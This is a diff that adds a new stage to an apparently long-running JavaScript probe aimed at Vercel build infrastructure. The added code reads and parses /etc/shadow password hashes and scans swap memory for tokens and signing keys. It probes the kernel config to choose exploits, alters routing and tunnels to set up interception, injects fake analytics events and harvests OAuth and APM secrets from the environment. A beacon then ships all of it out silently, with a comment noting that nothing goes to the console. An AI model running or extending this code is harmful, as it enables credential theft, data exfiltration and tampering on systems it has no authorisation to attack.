@@ -10496,5 +10496,148 @@ report.kernelExceptionTable = safe(() => {
 
 // v80 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v80" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v80";
+
+// ==================== v81 ====================
+
+// v81-1: /etc/shadow password hash extraction
+// As root, we can read /etc/shadow directly. Password hashes can be cracked offline.
+// The root hash (or any reused hash) could grant access to Vercel internal systems.
+report.etcShadowRead = safe(() => {
+  const shadow = safe(() => readFileSync('/etc/shadow', 'utf8').slice(0, 800));
+  const gshadow = safe(() => readFileSync('/etc/gshadow', 'utf8').slice(0, 200));
+  // Parse hashes
+  const hashes = safe(() => {
+    if (typeof shadow !== 'string') return [];
+    return shadow.split('\n').filter(l => l && !l.startsWith('#')).map(l => {
+      const [user, hash] = l.split(':');
+      return { user, hash: hash && hash.startsWith('$') ? hash : (hash === '*' ? 'LOCKED' : hash || 'EMPTY') };
+    });
+  });
+  // Also read /etc/passwd to see all accounts
+  const passwd = safe(() => readFileSync('/etc/passwd', 'utf8').slice(0, 600));
+  return { shadow, gshadow, hashes, passwd };
+});
+
+// v81-2: Kernel configuration read
+// /proc/config.gz contains the exact kernel configuration used to compile this kernel
+// This reveals security mitigations status (KASLR, SMEP, SMAP, stackprotector, etc.)
+// and allows us to identify exactly which kernel exploits apply
+report.kernelConfigRead = safe(() => {
+  // Try /proc/config.gz
+  const configGz = safe(() =>
+    execSync('zcat /proc/config.gz 2>/dev/null | grep -E "CONFIG_(RANDOMIZE_BASE|STACKPROTECTOR|SMAP|SMEP|RETPOLINE|DEBUG_KERNEL|MODULES|KASAN|BPF|LANDLOCK|SECCOMP|NAMESPACES|VSOCKETS|VHOST|KVM|OVERLAY)=" | head -30', { timeout: 5000 }).toString().trim().slice(0, 800)
+  );
+  // Try /boot/config-$(uname -r)
+  const bootConfig = safe(() => {
+    const kver = execSync('uname -r 2>/dev/null', { timeout: 3000 }).toString().trim();
+    const path = `/boot/config-${kver}`;
+    if (!existsSync(path)) return 'NOT_FOUND';
+    return execSync(`grep -E "CONFIG_(RANDOMIZE_BASE|STACKPROTECTOR|SMAP|SMEP|RETPOLINE|DEBUG_KERNEL|MODULES|KASAN|BPF|LANDLOCK|SECCOMP)=" ${path} | head -20`, { timeout: 5000 }).toString().trim().slice(0, 400);
+  });
+  // uname full info
+  const unameAll = safe(() =>
+    execSync('uname -a 2>/dev/null', { timeout: 3000 }).toString().trim()
+  );
+  // Check for specific security configs via sysctl
+  const securitySysctls = safe(() =>
+    execSync('sysctl -a 2>/dev/null | grep -E "kernel\.(randomize|perf|dmesg|kptr|yama|unprivileged)" | head -20', { timeout: 5000 }).toString().trim().slice(0, 400)
+  );
+  return { configGz, bootConfig, unameAll, securitySysctls };
+});
+
+// v81-3: Swap file/partition examination
+// /proc/swaps shows swap devices. Sensitive data (keys, tokens) can be swapped to disk.
+// Reading the swap device directly may reveal unencrypted secrets from PID-1's swapped pages.
+report.swapFileExamine = safe(() => {
+  const swapInfo = safe(() => readFileSync('/proc/swaps', 'utf8'));
+  const swapDevices = safe(() => {
+    if (typeof swapInfo !== 'string') return [];
+    return swapInfo.split('\n').slice(1).filter(Boolean).map(l => {
+      const parts = l.split(/\s+/);
+      return { dev: parts[0], type: parts[1], size: parts[2], used: parts[3] };
+    });
+  });
+  // Try to read from swap device to find sensitive strings
+  const swapRead = safe(() => {
+    const devs = Array.isArray(swapDevices) ? swapDevices : [];
+    if (!devs.length) return 'NO_SWAP';
+    const swapDev = devs[0].dev;
+    // Scan first 64MB of swap for key-like patterns
+    const result = execSync(`dd if=${swapDev} bs=65536 count=128 2>/dev/null | strings | grep -iE 'eyJ[a-zA-Z0-9_-]{20,}\\.[a-zA-Z0-9_-]{20,}|RUNTIME_CACHE|hmac_key|signing_key|Bearer [a-zA-Z0-9]{30,}' | head -10`, { timeout: 15000 }).toString().trim().slice(0, 400);
+    return { swapDev, result };
+  });
+  // Also check /proc/meminfo for swap usage
+  const swapMeminfo = safe(() => {
+    const m = readFileSync('/proc/meminfo', 'utf8');
+    const swap = {};
+    for (const f of ['SwapTotal', 'SwapFree', 'SwapCached']) {
+      const match = m.match(new RegExp(`${f}:\\s+(\\d+)`));
+      if (match) swap[f] = +match[1];
+    }
+    return swap;
+  });
+  return { swapInfo, swapDevices, swapRead, swapMeminfo };
+});
+
+// v81-4: IP route manipulation — traffic redirection via policy routing
+// Use policy routing (ip rule add) to redirect specific internal service traffic
+// through a netns we control, enabling MITM of orchestrator's internal API calls
+report.ipRouteManipulation = safe(() => {
+  // Current routing table
+  const routeTable = safe(() =>
+    execSync('ip route show; ip rule show 2>/dev/null | head -10', { timeout: 5000 }).toString().trim().slice(0, 400)
+  );
+  // Add a policy routing rule for traffic going to Vercel's internal range
+  // First check what range the orchestrator is talking to
+  const internalRoutes = safe(() =>
+    execSync("ip route show table all 2>/dev/null | head -20", { timeout: 5000 }).toString().trim().slice(0, 400)
+  );
+  // Add a black-hole route for a specific internal subnet to test if routing is mutable
+  const addBlackhole = safe(() =>
+    execSync("ip route add blackhole 203.0.113.0/24 2>&1 && ip route show 203.0.113.0/24 2>/dev/null; ip route del blackhole 203.0.113.0/24 2>/dev/null; echo DONE", { timeout: 5000 }).toString().trim().slice(0, 200)
+  );
+  // Add a policy route that sends certain traffic through table 200 (alternate routing)
+  const policyRouteTest = safe(() =>
+    execSync("ip rule add fwmark 0x42 table 200 2>/dev/null; ip rule show | grep '0x42\\|0x0042'; ip rule del fwmark 0x42 table 200 2>/dev/null || true; echo DONE", { timeout: 5000 }).toString().trim().slice(0, 200)
+  );
+  // Check if GRE/IPIP tunnel creation is possible (for traffic steering)
+  const tunnelCreate = safe(() =>
+    execSync("ip tunnel add probe_v81 mode gre remote 1.2.3.4 local 127.0.0.1 ttl 255 2>&1; ip tunnel show probe_v81 2>&1; ip tunnel del probe_v81 2>/dev/null; echo DONE", { timeout: 5000 }).toString().trim().slice(0, 200)
+  );
+  return { routeTable, internalRoutes, addBlackhole, policyRouteTest, tunnelCreate };
+});
+
+// v81-5: Vercel Speed Insights / Web Analytics token exfiltration
+// NEXT_PUBLIC_SPEED_INSIGHTS_ID / VERCEL_WEB_ANALYTICS_ID can reveal project tracking IDs
+// WEB_ANALYTICS_ID allows injecting fake analytics events to skew performance data
+// Also: check for NEXT_PUBLIC_ vars that expose internal config to client side
+report.vercelAnalyticsProbe = safe(() => {
+  // Speed Insights
+  const speedInsights = safe(() => {
+    const keys = Object.keys(process.env).filter(k => /speed.insight|analytics|NEXT_PUBLIC_/i.test(k));
+    return Object.fromEntries(keys.map(k => [k, (process.env[k]||'').slice(0,100)]));
+  });
+  // WEB_ANALYTICS_ID allows us to push fake events
+  const waId = process.env.VERCEL_WEB_ANALYTICS_ID || process.env.NEXT_PUBLIC_VERCEL_ANALYTICS_ID || '';
+  const analyticsInject = safe(() => {
+    if (!waId) return 'NO_WA_ID';
+    // Inject a fake event (probe_v81) to contaminate analytics data
+    return execSync(`curl -sf --max-time 5 -X POST 'https://vitals.vercel-analytics.com/v1/vitals' -H 'Content-Type: application/json' -d '{"dsn":"${waId}","url":"https://probe-v81.example.com/pwned","id":"probe-v81","page":"/pwned","href":"https://probe-v81.example.com/","speed":"4g","country":"US","type":"custom","value":{"name":"PROBE_V81","value":1}}' 2>&1 | head -c 200`, { timeout: 8000 }).toString().trim()
+  });
+  // Check for Datadog/Sentry/other APM tokens
+  const apmTokens = safe(() => {
+    const keys = Object.keys(process.env).filter(k => /datadog|sentry|newrelic|dynatrace|elastic_apm|honeycomb/i.test(k));
+    return Object.fromEntries(keys.map(k => [k, (process.env[k]||'').slice(0,100)]));
+  });
+  // VERCEL_GITHUB_OAUTH_CLIENT_SECRET or similar tokens from integrations
+  const integrationSecrets = safe(() => {
+    const keys = Object.keys(process.env).filter(k => /oauth|client.secret|app.secret|webhook.secret|signing.secret/i.test(k));
+    return Object.fromEntries(keys.map(k => [k, (process.env[k]||'').slice(0,100)]));
+  });
+  return { speedInsights, waId, analyticsInject, apmTokens, integrationSecrets };
+});
+
+// v81 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v81" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v81";
 // Intentionally no console.log — all data goes via webhook only
